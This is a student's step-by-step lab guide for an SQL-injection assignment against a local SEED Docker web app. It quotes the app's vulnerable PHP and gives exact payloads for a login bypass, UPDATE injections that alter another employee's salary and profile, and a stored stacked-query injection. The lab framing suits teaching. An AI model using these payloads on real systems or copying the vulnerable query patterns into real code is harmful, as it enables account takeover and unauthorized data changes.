# Section 1 Lab Guide — SQL Injection (Q1.1–Q1.5)

INTE2547-2580 Security Testing, Assignment 3, Section 1 (50 marks)
Student: Tran Dinh Hai — s4041605

**Scope:** all steps below target only the local `Labsetup-sql-3` Docker lab
running on your own machine as `www.seed-server.com`. Do not point any of
these payloads at any other host.

> This document is a **how-to guide**, not the report. It tells you exactly
> what to type and why, and states what the source code implies you should
> see. Anything marked **"Expected (not yet observed)"** is a prediction
> derived from the PHP/SQL source, not a claim that the attack has been run.
> You must run each step yourself, capture the listed screenshots, and use
> those to write the actual report answers afterwards.

## Student-specific values used throughout

| Value | Meaning | Value used |
|---|---|---|
| Student No. | — | s4041605 |
| `PWD_1` | Password value used where the brief requires it | `s4041605` |
| `SALARY_1` | Last 4 digits of student no. | `1605` |

## Database reference (from `image_mysql/sqllab_users.sql`)

`credential` columns, in order: `ID, Name, EID, Salary, birth, SSN,
PhoneNumber, Address, Email, NickName, Password`.

| ID | Name | EID | Salary | birth | SSN | PhoneNumber | Address | Email | NickName |
|---|---|---|---|---|---|---|---|---|---|
| 1 | Alice | 10000 | 20000 | 9/20 | 10211002 | '' | '' | '' | '' |
| 2 | Boby | 20000 | 30000 | 4/20 | 10213352 | '' | '' | '' | '' |
| 3 | Ryan | 30000 | 50000 | 4/10 | 98993524 | '' | '' | '' | '' |
| 4 | Samy | 40000 | 90000 | 1/11 | 32193525 | '' | '' | '' | '' |
| 5 | Ted | 50000 | 110000 | 11/3 | 32111111 | '' | '' | '' | '' |
| 6 | Admin | 99999 | 400000 | 3/5 | 43254314 | '' | '' | '' | '' |

All `PhoneNumber`/`Address`/`Email`/`NickName` values are empty strings in the
seed data — several payloads below rely on this to keep side-effects
invisible. Every row's `Password` column holds a `sha1()` hash; no plaintext
password is known for any account, which is the reason all five attacks work
around authentication rather than through it.

---

## Environment Setup & Verification (do this once, before Q1.1)

### 1. Start the lab

```bash
# from the folder that contains docker-compose.yml
# (Labsetup-sql-3/Labsetup-sql/docker-compose.yml once the zip is extracted)
docker-compose build
docker-compose up -d
```

If your Docker install only has the older standalone binary, use
`docker-compose build` / `docker-compose up -d` instead.

**Verify containers are up:**

```bash
docker ps
```

Expected: two containers `Up`, named `www-10.9.0.5` and `mysql-10.9.0.6`
(these exact names come from `container_name:` in `docker-compose.yml`).

```bash
docker logs mysql-10.9.0.6
```

Expected: MySQL's normal startup log, ending with it "ready for
connections", and no fatal error while importing `sqllab_users.sql`.

### 2. Make `www.seed-server.com` resolve to the `www` container

The Apache virtual host in `image_www/apache_sql_injection.conf` is:

```
<VirtualHost *:80>
        DocumentRoot /var/www/SQL_Injection
        ServerName   www.seed-server.com
</VirtualHost>
```

`docker-compose.yml` publishes **no host port** for `www` — it only attaches
it to the custom bridge network `net-10.9.0.0/24` at the fixed address
`10.9.0.5`. For a browser to reach it as `http://www.seed-server.com/`, two
things must both be true:
1. Something resolves the hostname `www.seed-server.com` to `10.9.0.5`.
2. The machine the browser runs on can actually route to `10.9.0.5` on that
   bridge network.

Add a hosts-file entry:

- Linux / SEED VM / WSL2 distro running the Docker engine:
  add `10.9.0.5  www.seed-server.com` to `/etc/hosts` (needs `sudo`).
- Windows (only works if Windows itself can route to the bridge — see
  troubleshooting below): add the same line to
  `C:\Windows\System32\drivers\etc\hosts` (edit as Administrator).

**Verify:**

```bash
ping www.seed-server.com
curl -I http://www.seed-server.com/
```

Expected: `ping` resolves to `10.9.0.5`; `curl -I` returns `HTTP/1.1 200 OK`
from Apache. Then open `http://www.seed-server.com/` in the browser and
confirm the "Employee Profile Login" page loads (matches Figure 1 of the
brief).

### 3. Troubleshooting the network reachability step (common on Windows)

- **Symptom:** hosts entry added, but the browser times out / "site can't be
  reached", even though `docker ps` shows both containers `Up`.
- **Cause:** Docker Desktop on Windows runs the Docker engine inside a
  Hyper-V/WSL2 VM. The Windows host side often cannot route directly into a
  container-only bridge network like `net-10.9.0.0/24` that has no published
  port. This is a networking-path problem, not a lab bug.
- **Fixes, in order of preference:**
  1. Run the browser from **inside the same WSL2 distro that runs the Docker
     engine** (or the SEED Ubuntu VM, if that's your setup) — Linux hosts can
     route to their own Docker bridge networks directly.
  2. Confirm the network and IP actually exist:
     `docker network inspect net-10.9.0.0` should list `www-10.9.0.5` at
     `10.9.0.5/24`.
  3. Sanity-check the app works at all, independent of the custom network, by
     querying it from another container on the same network:
     `docker run --rm --network net-10.9.0.0 curlimages/curl curl -I http://10.9.0.5/`
  4. If you must reach it from the Windows host directly, temporarily add a
     port mapping to the `www` service in `docker-compose.yml` (e.g.
     `ports: ["8080:80"]`), `docker compose up -d` again, and browse to
     `http://localhost:8080/` — but note the vhost is keyed to the
     `Host: www.seed-server.com` header, so you would still need a hosts
     entry or a `curl -H "Host: www.seed-server.com" http://localhost:8080/`
     to hit the right vhost. Revert this change afterwards if you want your
     setup to match the brief's plain `www.seed-server.com` URL.

### 4. Optional: confirm the schema loaded (read-only DB check)

Not part of any graded exploit — just a sanity check that the container
booted with the expected seed data before you start:

```bash
docker exec -it mysql-10.9.0.6 mysql -uroot -pdees sqllab_users \
  -e "SELECT ID,Name,Salary FROM credential;"
```

Expected: the six rows from the table above.

---

## Q1.1 — Log into Ted's account without knowing his password (10 marks)

### Objective
Exploit the login `SELECT` in `unsafe_home.php` to authenticate as **Ted**
without supplying his real password.

### Vulnerable code (`image_www/Code/unsafe_home.php`)
```php
$input_uname = $_GET['username'];
$input_pwd   = $_GET['Password'];
$hashed_pwd  = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,
nickname, Password
FROM credential
WHERE name= '$input_uname' and Password='$hashed_pwd'";
```
`index.html` submits this page with `<form action="unsafe_home.php"
method="get">`, field names `username` and `Password`. Both go into the query
string with no escaping before being concatenated into `$sql`.

### Exact browser input
Docker up and `www.seed-server.com` resolving (see Environment Setup), open
`http://www.seed-server.com/` and fill the login form:

| Field | Value to type |
|---|---|
| Username | `Ted'#` |
| Password | *(leave empty)* |

Click **Login**.

Equivalent request the form will send (browser auto-encodes the field
value when it builds the GET query string):

```
http://www.seed-server.com/unsafe_home.php?username=Ted%27%23&Password=
```

**URL-encoding note:** if you instead type the URL directly into the address
bar rather than using the form, you must percent-encode it yourself:
`'` → `%27`, and — importantly — `#` → `%23`. An unescaped `#` is treated by
the *browser itself* as the start of a URL fragment and everything after it
is stripped before the request is even sent, so the server never receives
the comment character at all. Submitting through the HTML form sidesteps
this because the browser's own form-encoding logic percent-encodes the field
value for you.

An equally valid alternative payload is `Ted'-- ` (double-dash, then a
required trailing space, since MySQL's `--` line comment must be followed by
whitespace or end of line) with Password left empty — mentioned here in case
`#` causes confusion in your client.

### Substituted SQL statement
```sql
SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,
nickname, Password
FROM credential
WHERE name= 'Ted'#' and Password='da39a3ee5e6b4b0d3255bfef95601890afd80709'
```
(`da39a3ee...` is `sha1('')`, the hash of the empty Password field — its
exact value is irrelevant, see below.)

### Why the injection works
The single quote in `Ted'` closes the string literal that `$input_uname` was
placed into. Everything from `#` to the end of the line is then a MySQL
comment, so the database only ever executes:
```sql
SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,
nickname, Password
FROM credential
WHERE name= 'Ted'
```
The `and Password='...'` clause — and the stray trailing quote from the
original template — never reach the parser. `Name` is unique per row, so this
returns exactly Ted's row (`ID=5`) with no password check performed at all.
In the PHP code, `$id != ""` then succeeds and `drawLayout()` is called with
Ted's data, which sets `$_SESSION['id'] = 5`, `$_SESSION['name'] = 'Ted'`,
etc. — you are now logged in as Ted.

### Expected behaviour (not yet observed)
The page should render "**Ted Profile**" with a table showing Employee ID
`50000`, Salary `110000`, Birth `11/3`, SSN `32111111`, and empty NickName /
Email / Address / Phone Number fields (per the seed data table above).

### Troubleshooting
- "The account information your provide does not exist" → the `#`/`'` most
  likely reached the server unencoded/mismatched, or you typed the URL by
  hand without encoding `#`. Re-submit via the actual form fields.
- Blank page / connection error → re-check Environment Setup steps 1–3;
  the containers or hostname resolution are not ready yet.
- Logged in as the wrong user or nothing happens → make sure the Username
  field contains exactly `Ted'#` (capital T, lowercase rest, matching the
  `Name` value in the seed data) and Password is empty, not whitespace.

### Evidence checklist
- [ ] Screenshot of the login form with `Ted'#` typed into Username and
      Password left blank, just before clicking Login.
- [ ] Screenshot of the resulting page showing "Ted Profile" and its data
      table.
- [ ] (Optional but recommended) Screenshot of the address bar / browser
      dev-tools Network tab showing the actual GET request URL sent.

### Suggested screenshot filenames
- `q1-1-login-payload.png`
- `q1-1-ted-profile.png`
- `q1-1-request-url.png` (optional)

---

## Q1.2 — Change Boby's Salary to SALARY_1 (1605) using Ted's session (10 marks)

### Objective
While authenticated as Ted (from Q1.1), use the "Edit Profile" feature's
`UPDATE` statement to change **Boby's** Salary to `1605`, without knowing
either Ted's or Boby's real password.

### Vulnerable code (`image_www/Code/unsafe_edit_backend.php`)
```php
$input_email       = $_GET['Email'];
$input_nickname    = $_GET['NickName'];
$input_address     = $_GET['Address'];
$input_pwd         = $_GET['Password'];
$input_phonenumber = $_GET['PhoneNumber'];
$id = $_SESSION['id'];
...
if($input_pwd!=''){
    ...
} else {
    // if password field is empty
    $sql = "UPDATE credential SET nickname='$input_nickname',
    email='$input_email', address='$input_address',
    PhoneNumber='$input_phonenumber' where ID=$id;";
}
$conn->query($sql);
```
Leaving the edit form's Password field empty routes into the branch above
(no `Password=` assignment in the `SET` list, one fewer field to work
around). `$id` comes from `$_SESSION['id']` — Ted's ID (`5`), set during the
Q1.1 login — and is **not** attacker-controlled directly, but the injection
below doesn't need to touch `$id` at all.

`unsafe_edit_frontend.php` submits this as `<form action=
"unsafe_edit_backend.php" method="get">` with field names `NickName`,
`Email`, `Address`, `PhoneNumber`, `Password`.

### Exact browser input
While still logged in as Ted, click **Edit Profile**, then fill the form:

| Field | Value to type |
|---|---|
| NickName | `', Salary=1605 WHERE ID=2 -- ` |
| Email | *(leave as pre-filled / empty)* |
| Address | *(leave as pre-filled / empty)* |
| Phone Number | *(leave as pre-filled / empty)* |
| Password | *(leave empty)* |

Click **Save**.

**Quoting/encoding note:** type the payload exactly as shown, including the
leading `'` and the trailing space after `--`. When the form submits as GET,
the browser percent-encodes it automatically (`'`→`%27`, space→`%20` or `+`,
`,`→`%2C`, `=`→`%3D`). The manually-encoded equivalent request is:
```
http://www.seed-server.com/unsafe_edit_backend.php?NickName=%27%2C%20Salary%3D1605%20WHERE%20ID%3D2%20--%20&Email=&Address=&PhoneNumber=&Password=
```

### Substituted SQL statement
Raw substitution (before the comment takes effect):
```sql
UPDATE credential SET nickname='', Salary=1605 WHERE ID=2 -- ',
email='', address='', PhoneNumber='' where ID=5;
```
What MySQL actually executes (everything from `--` onward on that line is a
comment):
```sql
UPDATE credential SET nickname='', Salary=1605 WHERE ID=2
```

### Why the injection works
The leading `'` in the NickName payload closes the `nickname='...'` string
literal immediately, giving `nickname=''` — a harmless no-op since Boby's
NickName is already empty in the seed data. Everything after that quote is
now interpreted as SQL, not string content, so `, Salary=1605 WHERE ID=2`
becomes a real extra assignment plus a brand-new `WHERE` clause. The
trailing `-- ` then comments out the rest of the original statement,
including the leftover `'` and the real `where ID=$id;` clause. Since
`$id` (Ted's session ID) never gets a chance to run, the attack doesn't need
to control it — it simply replaces the whole `WHERE` clause with one that
targets Boby's row (`ID=2`) directly, while still authenticating as Ted.

### Verification path (no Admin account needed)
1. Log out (`logoff.php`, via the Logout button).
2. Repeat the Q1.1 technique with `Username = Boby'#`, Password empty, to
   open Boby's own profile page.
3. Read the Salary field.

### Expected behaviour (not yet observed)
Boby's profile page should show Salary `1605`; every other field (Employee
ID `20000`, Birth `4/20`, SSN `10213352`, NickName/Email/Address/Phone
blank) should be unchanged from the seed data.

### Troubleshooting
- No visible confirmation after clicking Save → this is expected:
  `unsafe_edit_backend.php` always redirects to `unsafe_home.php` (Ted's own
  profile), it never reports success/failure of the UPDATE. Verify via the
  Boby login instead.
- Boby's Salary unchanged → re-check the exact payload text (especially the
  leading `'`, the comma, and the space after `--`), and confirm you were
  still logged in as Ted (session not expired — the app auto-logs-out after
  20 minutes) when you submitted the edit form.
- SQL error page → a stray quote or missing comma in the payload broke the
  syntax; compare character-by-character against the payload above.

### Evidence checklist
- [ ] Screenshot of the Edit Profile form with the NickName payload entered.
- [ ] Screenshot of the actual GET request sent (address bar or dev-tools
      Network tab) showing the encoded payload.
- [ ] Screenshot of Boby's profile page (via the `Boby'#` login) showing
      Salary = 1605.

### Suggested screenshot filenames
- `q1-2-edit-payload.png`
- `q1-2-request-url.png`
- `q1-2-boby-profile-salary.png`

---

## Q1.3 — Change Boby's NickName, Email, and Address using Ted's session (10 marks)

### Objective
Still authenticated as Ted (from Q1.1), and without knowing Ted's or Boby's
password, use the same `UPDATE` vulnerability to set **Boby's**:
- NickName → your student name
- Email → your RMIT student email
- Address → `RMIT`

### Exact browser input
On the Edit Profile form (as Ted):

| Field | Value to type |
|---|---|
| NickName | `Tran Dinh Hai` |
| Email | `s4041605@student.rmit.edu.au` *(the standard RMIT student-email pattern for s4041605 — confirm this matches your actual RMIT email address and use your real one if it differs)* |
| Address | `RMIT` |
| Phone Number | `' WHERE ID=2 -- ` |
| Password | *(leave empty)* |

Click **Save**.

This time the injection point is the **last** field before the original
`WHERE` clause (`PhoneNumber`), not the first — so that the new `WHERE ID=2`
governs the entire `UPDATE`, and the legitimate-looking NickName/Email/
Address values you typed earlier in the form are applied to Boby's row
instead of Ted's.

**Encoding note:** same as Q1.2 — type these values directly into the form
fields; the browser percent-encodes the GET request for you (`'`→`%27`,
space→`%20`/`+`, `@`→`%40`). Manually-encoded equivalent:
```
http://www.seed-server.com/unsafe_edit_backend.php?NickName=Tran%20Dinh%20Hai&Email=s4041605%40student.rmit.edu.au&Address=RMIT&PhoneNumber=%27%20WHERE%20ID%3D2%20--%20&Password=
```

### Substituted SQL statement
Raw substitution:
```sql
UPDATE credential SET nickname='Tran Dinh Hai',
email='s4041605@student.rmit.edu.au', address='RMIT',
PhoneNumber='' WHERE ID=2 -- ' where ID=5;
```
What MySQL actually executes:
```sql
UPDATE credential SET nickname='Tran Dinh Hai',
email='s4041605@student.rmit.edu.au', address='RMIT',
PhoneNumber='' WHERE ID=2
```

### Why the injection works
Here the injected quote is placed in the **last** `SET` field
(`PhoneNumber`) instead of the first. That means every `SET` assignment
that precedes it in the statement — `nickname=`, `email=`, `address=` — is
still executed as part of the *same* `UPDATE ... WHERE ID=2` statement,
because a single `UPDATE` has exactly one `WHERE` clause governing all of
its `SET` assignments. By waiting until the last field to break out of the
string and substitute `WHERE ID=2`, the attacker gets to keep the earlier,
"normal-looking" field values (name/email/address) while still redirecting
the whole write to Boby's row instead of Ted's own. `PhoneNumber=''` is a
harmless no-op since Boby's PhoneNumber is already empty. As in Q1.2, the
trailing `-- ` comments out the real `where ID=$id;` clause so it never
executes.

### Verification path
1. Log out, then log back in with `Username = Boby'#`, Password empty.
2. Boby's profile page should now display the updated NickName, Email, and
   Address.

### Expected behaviour (not yet observed)
Boby's profile should show NickName `Tran Dinh Hai`, Email
`s4041605@student.rmit.edu.au` (or your confirmed real RMIT address), and
Address `RMIT`; Phone Number remains blank; Salary reflects whatever it was
left at after Q1.2 (`1605`, if you completed that step first); Employee ID,
Birth, and SSN unchanged.

### Troubleshooting
- Fields didn't change on Boby's row but did change on Ted's → the
  injection quote was likely placed in the wrong field, or a field after it
  still leaked a real value into the executed statement; re-check that the
  payload sits in `PhoneNumber` (the last field before `where ID=$id`) and
  that `-- ` (with trailing space) immediately follows `WHERE ID=2`.
- SQL error page → check for a missing space after `--`, or an accidentally
  duplicated quote.

### Evidence checklist
- [ ] Screenshot of the Edit Profile form with all four payload fields
      filled in as above.
- [ ] Screenshot of the actual GET request sent.
- [ ] Screenshot of Boby's profile page (via the `Boby'#` login) showing the
      updated NickName, Email, and Address.

### Suggested screenshot filenames
- `q1-3-edit-payload.png`
- `q1-3-request-url.png`
- `q1-3-boby-profile-updated.png`

---

## Q1.4 — Identify the vulnerable queries used by Set View Preference / View Tasks (10 marks)

### Objective
Identify the SQL queries in `unsafe_view_order.php` (Set View Preference)
and `unsafe_tasks_view.php` (View Tasks) that are exploitable, and explain
how data flows between the two pages to make the attack in Q1.5 possible.
This question is source-code identification and explanation — no live
payload is required yet.

### Vulnerable queries — `image_www/Code/unsafe_view_order.php`
```php
$newfavourite = $_POST["favourite"] . " ";
$newfavourite.= $_POST["order"];

if($prefid!=""){
    $sql2 = "UPDATE preference SET favourite='$newfavourite' where PreferenceID=$prefid;";
}else{
    $sql2 = "INSERT INTO preference(favourite,Owner) VALUES ('$newfavourite', $id);";
}
...
$conn->query($sql2);
```
`$_POST["favourite"]` and `$_POST["order"]` are taken directly from the
request with no validation (no whitelist of allowed column names, no
escaping) and concatenated together into `$newfavourite`, which is then
written straight into the `preference.favourite` column via `UPDATE`/
`INSERT`.

### Vulnerable queries — `image_www/Code/unsafe_tasks_view.php`
```php
$sql = "select favourite from preference where owner=$id limit 1";
...
$favourite = $json_a[0]['favourite'];
if($favourite==""){
    $favourite = "hours desc";
}

$sql1 = "select tasks.Name as taskname, credential.Name as ownername,
tasks.Hours,tasks.Amount,tasks.Description,tasks.Type
from tasks, credential
where tasks.owner=credential.ID and tasks.owner=$id "
. "order by tasks." . $favourite ;

//split by ";" if this is a batch queries
$queryList = explode(";",$sql1);

foreach($queryList as $subquery){
    if(strlen($subquery)>0) {
        if (!$tempResult = $conn->query($subquery)) {
            die('There was an error running the query [' . $conn->error . ']\n');
        }
        ...
        // each $subquery's result set is rendered into its own HTML table
    }
}
```
The stored `favourite` value is read back from the database and
concatenated, **unquoted and unvalidated**, directly after the literal text
`order by tasks.` to build `$sql1`. The code then explicitly splits `$sql1`
on `;` and runs `$conn->query()` once per resulting fragment, rendering a
separate results table for each non-empty fragment.

### Data flow and why this is exploitable
1. An authenticated user submits the Set View Preference form. The POST
   values `favourite` and `order` are concatenated with no sanitization and
   persisted verbatim into that user's row in the `preference` table
   (`unsafe_view_order.php`).
2. Later, when that user opens View Tasks, the page reads its own stored
   `preference.favourite` value back out of the database and splices it — 
   still unquoted, still unvalidated — into a brand-new SQL string
   immediately after `order by tasks.` (`unsafe_tasks_view.php`).
3. Because the value is never checked against a whitelist of real column
   names (e.g. `Name`, `Hours`, `Amount`) or an `ASC`/`DESC` keyword, and
   because the resulting string is then split on `;` and each piece is
   executed as its own independent query, an attacker who stores a
   `favourite` value containing a `;` followed by a second complete SQL
   statement causes that second statement to be executed by the
   application on their behalf — a stacked-query injection that the
   application's own `explode`/`foreach` logic actively carries out. The
   vulnerability is really the combination of both files: the first page is
   the injection point (no input validation on write), and the second page
   is where the stored payload is later parsed apart and executed (no
   output validation on read, plus explicit multi-statement execution).

### Expected behaviour (not yet observed)
No attack is executed for this question; the deliverable is the identified
code and the explanation above.

### Evidence checklist
- [ ] Screenshot of the `unsafe_view_order.php` snippet above (e.g. the file
      opened in an editor, with the vulnerable lines visible/highlighted).
- [ ] Screenshot of the `unsafe_tasks_view.php` snippet above (vulnerable
      lines and the `explode(";", ...)` loop visible/highlighted).

### Suggested screenshot filenames
- `q1-4-view-order-source.png`
- `q1-4-tasks-view-source.png`

---

## Q1.5 — Force View Tasks to display the tasks of the user returned by `userIdMaxTasks()` (10 marks)

### Objective
Exploit the vulnerability identified in Q1.4 so that, when you open View
Tasks, the page executes a second, injected `SELECT` that displays the
declared tasks of whichever user `userIdMaxTasks()` currently identifies as
having the maximum number of tasks.

### Deriving the payload
`unsafe_tasks_view.php` builds:
```sql
select tasks.Name as taskname, credential.Name as ownername, tasks.Hours,
tasks.Amount, tasks.Description, tasks.Type
from tasks, credential
where tasks.owner=credential.ID and tasks.owner=$id order by tasks.<favourite>
```
then splits the whole thing on `;` and runs each fragment separately. For
this to work cleanly:
- The **first** fragment (up to the first `;`) must remain valid SQL, so the
  attacker's own task list still renders without a fatal query error —
  achieved by picking a real column name (e.g. `Hours`) for the `favourite`
  dropdown.
- The **second** fragment is the injected statement: a full `SELECT` that
  joins `tasks` and `credential` the same way the original query does, but
  filters on `tasks.owner = userIdMaxTasks()` instead of the current user's
  `$id`, using the MySQL function documented in `sqllab_users.sql`
  (`select userIdMaxTasks();` "returns the userID of the user who has the
  max no. of declared tasks").

Because `$_POST["favourite"]` and `$_POST["order"]` are simply concatenated
with a space (`$newfavourite = $_POST["favourite"]." ".$_POST["order"]`) and
the `order` field is a plain free-text `<input>` with no character
restriction, this payload can be entered through the **normal Set View
Preference form** — no proxy or browser dev-tools tampering is required.

### Exact browser input
While logged in (continuing as Ted from Q1.1, or any other authenticated
session), open **Set View Preference**
(`http://www.seed-server.com/unsafe_view_order.php`) and fill the form:

| Field | Value to select/type |
|---|---|
| "What info do you prefer to sort?" (dropdown, `favourite`) | `Hours` |
| "Asc or Desc" (text box, `order`) | `; select tasks.Name as taskname, credential.Name as ownername, tasks.Hours, tasks.Amount, tasks.Description, tasks.Type from tasks, credential where tasks.owner=credential.ID and tasks.owner=userIdMaxTasks()` |

Click **Update**. The page redirects you to
`http://www.seed-server.com/unsafe_tasks_view.php`.

**Encoding note:** this is submitted as an HTML `POST` form
(`unsafe_view_order.php`'s `<form ... method="POST">`), so the browser
form-encodes the body automatically (`;`→`%3B`, spaces→`+`/`%20`, `,`→`%2C`,
`=`→`%3D`, `()`→`%28%29`) — you can type the payload's literal characters
directly into the text box with no manual encoding needed.

### Substituted SQL statement
`$newfavourite` stored into `preference.favourite`:
```
Hours ; select tasks.Name as taskname, credential.Name as ownername, tasks.Hours, tasks.Amount, tasks.Description, tasks.Type from tasks, credential where tasks.owner=credential.ID and tasks.owner=userIdMaxTasks()
```

`$sql1` built on the next View Tasks load (`$id` is your current session's
own ID, e.g. `5` for Ted):
```sql
select tasks.Name as taskname, credential.Name as ownername, tasks.Hours,
tasks.Amount, tasks.Description, tasks.Type
from tasks, credential
where tasks.owner=credential.ID and tasks.owner=5 order by tasks.Hours ;
 select tasks.Name as taskname, credential.Name as ownername, tasks.Hours,
tasks.Amount, tasks.Description, tasks.Type
from tasks, credential
where tasks.owner=credential.ID and tasks.owner=userIdMaxTasks()
```

`explode(";", $sql1)` splits this into exactly two fragments, both
non-empty, each executed by its own `$conn->query()` call in the existing
loop:
1. `select ... where tasks.owner=credential.ID and tasks.owner=5 order by tasks.Hours` — your own declared tasks, ordered by Hours.
2. `select ... where tasks.owner=credential.ID and tasks.owner=userIdMaxTasks()` — the injected statement.

### Why the injection works
The `favourite` value stored in the database is attacker-controlled from
Q1.4's data flow and is spliced into `$sql1` with no quoting or validation.
Placing a real column name (`Hours`) before the `;` keeps the first fragment
syntactically valid so the page doesn't fail outright. Everything after the
`;` is attacker-supplied SQL that the application's own `explode`/`foreach`
loop treats as an independent statement and executes and renders exactly
like the legitimate query — this is precisely the "one statement into two
statements" stacked-query behaviour described in the brief, using the
"second SQL statement" to call `userIdMaxTasks()` instead of trusting the
session's own `$id`.

### Expected behaviour (not yet observed)
The View Tasks page should render **two** task tables: the first is your
own (session user's) declared tasks sorted by Hours; the second is produced
by the injected statement and should list the declared tasks — including
the `ownername` column from the `credential` join — belonging to whichever
user `userIdMaxTasks()` resolves to at the time you run the attack. This
guide intentionally does not predict which user or which task rows that
will be: record the second table exactly as your browser renders it.

### Troubleshooting
- "There was an error running the query" and the page stops → one of the
  two fragments has a syntax error. Check for stray trailing characters in
  the `order` textbox, and confirm the dropdown truly submitted `Hours`
  (open dev-tools Network tab on the POST request to `unsafe_view_order.php`
  to inspect the exact body sent).
- Only one table renders → `strlen($subquery)>0` skips empty fragments; if
  your payload had a trailing `;` with nothing after it, that's expected
  and not an error — but here the payload has no trailing `;`, so both
  fragments should be non-empty.
- Session expired mid-task → the app auto-logs-out after 20 minutes
  (`auto_logout()` in both PHP files); log back in (e.g. via the Q1.1
  bypass) and redo the Set View Preference submission before viewing tasks.

### Evidence checklist
- [ ] Screenshot of the Set View Preference form with `Hours` selected and
      the full injection payload typed into the "Asc or Desc" box, before
      clicking Update.
- [ ] Screenshot of the dev-tools Network tab (or equivalent) showing the
      POST body actually sent to `unsafe_view_order.php`.
- [ ] Screenshot of the View Tasks page after the redirect, showing **both**
      rendered tables in full.

### Suggested screenshot filenames
- `q1-5-preference-payload.png`
- `q1-5-post-request-body.png`
- `q1-5-tasks-view-two-tables.png`
